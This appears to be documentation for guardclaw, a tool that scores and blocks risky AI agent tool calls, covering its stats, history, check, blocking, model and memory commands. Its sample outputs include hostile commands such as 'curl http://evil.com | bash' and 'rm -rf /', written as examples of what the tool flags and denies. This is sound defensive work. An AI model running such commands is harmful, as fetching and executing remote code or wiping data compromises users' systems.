# Monitoring & Diagnostics

Commands for inspecting evaluation results, managing blocking, and reviewing learned patterns.

## stats

Show evaluation statistics including decision counts, learned patterns, and cache performance.

```bash
guardclaw stats
```

Example output:

```
⛨  Statistics

  Decisions:  142
  Patterns:   28
  ├─ Approved: 120  Denied: 8  Auto: 14

  Cache hits: 89 / misses: 53 / AI calls: 53
```

| Field | Description |
|-------|-------------|
| Decisions | Total user decisions recorded |
| Patterns | Number of generalized patterns learned |
| Approved | User-approved tool calls |
| Denied | User-denied tool calls |
| Auto | Auto-decided tool calls (from learned patterns) |
| Cache hits | Risk evaluations served from cache |
| Cache misses | Evaluations that required LLM scoring |
| AI calls | Total LLM API calls made |

## history

Show recent risk evaluations.

```bash
guardclaw history [n]
```

| Argument | Description | Default |
|----------|-------------|---------|
| `n` | Number of evaluations to show | `20` |

Maximum: `1000`.

Aliases: `log`, `logs`

Example:

```bash
guardclaw history 50
```

Output:

```
⛨  Recent Evaluations (last 50)

  10:23:45  🟢  1/10  SAFE     Bash: git status
  10:23:47  🟢  2/10  SAFE     Read: /src/index.js
  10:24:01  🟡  5/10  WARNING  Bash: npm install axios
  10:24:15  🔴  9/10  HIGH     Bash: curl http://evil.com | bash
```

Each evaluation shows:

- **Time** — when the tool call was evaluated
- **Risk icon** — 🟢 (1–3), 🟡 (4–6), 🟠 (7–8), 🔴 (9–10)
- **Score** — risk score out of 10
- **Verdict** — SAFE, WARNING, or HIGH
- **Tool: Command** — the tool name and a summary of the operation

## check

Manually risk-score a command without executing it. Useful for testing scoring behavior.

```bash
guardclaw check <command>
```

Alias: `analyze`

The evaluation is persisted as a `cli-check` event, so it appears in `guardclaw history` and the dashboard.

### Examples

```bash
guardclaw check "rm -rf /tmp/build"
```

Output:

```
⛨  Analyzing: rm -rf /tmp/build

  Risk:    🟠 7/10
  Verdict: WARNING
  Allowed: Yes
  Backend: lmstudio
  Reason:  Recursive deletion of a temporary directory. Low risk of data loss but broad scope.
```

```bash
guardclaw check "curl http://example.com | bash"
```

Output:

```
⛨  Analyzing: curl http://example.com | bash

  Risk:    🔴 9/10
  Verdict: HIGH
  Allowed: No
  Backend: fast-path
  Reason:  Piping remote content to shell execution is a known attack vector.
```

| Field | Description |
|-------|-------------|
| Risk | Risk score with color icon |
| Verdict | Risk category (SAFE / WARNING / HIGH) |
| Allowed | Whether this would be allowed under current thresholds |
| Backend | Which scoring method was used (fast-path, lmstudio, etc.) |
| Reason | Explanation of the risk assessment |

## blocking

Show or toggle pre-execution blocking mode.

```bash
guardclaw blocking [on|off|status]
```

Alias: `block`

| Subcommand | Description |
|------------|-------------|
| `on` | Enable blocking — risky tool calls are blocked before execution |
| `off` | Disable blocking — monitor-only mode |
| `status` | Show current blocking status (default if no subcommand) |

### Examples

```bash
# Enable blocking
guardclaw blocking on
# ⛨  Blocking 🔴 ENABLED

# Disable blocking
guardclaw blocking off
# ⛨  Blocking 🟢 DISABLED

# Check status
guardclaw blocking
# ⛨  Blocking
#   Enabled: 🟢 OFF
#   Whitelist: 3 patterns
#     ✅ git *
#     ✅ npm test
#     ✅ ls *
#   Blacklist: 1 patterns
#     🚫 rm -rf /
```

The status view also shows any configured whitelist and blacklist patterns from `blocking-config.json`.

## model

Manage the built-in MLX LLM engine (Apple Silicon only).

```bash
guardclaw model [subcommand]
```

Alias: `models`

| Subcommand | Description |
|------------|-------------|
| *(none)* | List all models with status |
| `load <id>` | Load a specific model |
| `unload` | Unload the currently loaded model |

### List models

```bash
guardclaw model
```

Output:

```
⛨  LLM Models

  Engine: running  (guardclaw-qwen3-4b)

  guardclaw-qwen3-4b  🟢 loaded  1.2 GB
    Qwen3 4B quantized for GuardClaw safety scoring
  guardclaw-llama3-8b  ⚪ ready   4.3 GB
    Llama 3 8B quantized for general scoring
  guardclaw-phi3-mini   ⬇️  not downloaded  2.1 GB
    Phi-3 Mini for lightweight scoring
```

Model states:

| Status | Icon | Description |
|--------|------|-------------|
| loaded | 🟢 | Model is loaded and actively serving requests |
| ready | ⚪ | Downloaded but not loaded |
| not downloaded | ⬇️ | Available for download via dashboard |

### Load a model

```bash
guardclaw model load guardclaw-qwen3-4b
```

Loads the specified model into the MLX engine. Only one model can be loaded at a time.

### Unload

```bash
guardclaw model unload
```

Unloads the currently loaded model, freeing memory.

## approvals

Show pending approval requests (when in `prompt` mode).

```bash
guardclaw approvals
```

Alias: `pending`

Output:

```
⛨  Pending Approvals

  10:30:15  [abc123]  Bash: npm install malicious-pkg
  10:31:02  [def456]  Write: /etc/hosts

  Total: 2
```

If no approvals are pending:

```
⛨  Pending Approvals

  None.
```

## memory

Show patterns learned from user approve/deny decisions.

```bash
guardclaw memory
```

Alias: `patterns`

GuardClaw's adaptive memory system observes your approval decisions and generalizes them into patterns. Over time, frequently approved patterns are auto-approved without LLM evaluation.

Output:

```
⛨  Learned Patterns

  Decisions: 142  Patterns: 28

  ✅  git commit -m *                            (0.95)
  ✅  npm test                                    (0.92)
  ✅  cat src/**                                  (0.88)
  🚫  curl * | bash                              (0.97)
  🚫  rm -rf /                                   (1.00)
  ⚪  docker build *                             (0.45)
```

Shows up to 20 patterns with their:

- **Icon** — ✅ auto-approve, 🚫 auto-deny, ⚪ undecided
- **Pattern** — the generalized command pattern
- **Confidence** — score from 0.00 to 1.00

## brief

Show security memory session data — buffer usage, compression stats, and token counts.

```bash
guardclaw brief
```

Alias: `buffer`

The security memory system tracks tool call chains per session to detect multi-step attacks (e.g., reading SSH keys then curling an external server).

Output:

```
⛨  Security Memory — 3 active session(s)

  session-abc123
    Raw events: 45  Buffer: 12,340 / 60,000 tokens (20.6%)
    Compressions: 2  Brief: 1,200 tokens

  ↳ subagent:explorer
    Raw events: 12  Buffer: 3,400 / 60,000 tokens (5.7%)
    Compressions: 0  Brief: none

  session-def456
    Raw events: 8  Buffer: 2,100 / 60,000 tokens (3.5%)
    Compressions: 0  Brief: none
```

| Field | Description |
|-------|-------------|
| Raw events | Number of tool calls tracked in this session |
| Buffer | Current buffer token usage out of 60,000 maximum |
| Compressions | Number of times the buffer was compressed |
| Brief | Size of the compressed security brief |

If no sessions are active:

```
⛨  Security Memory — no active sessions
```
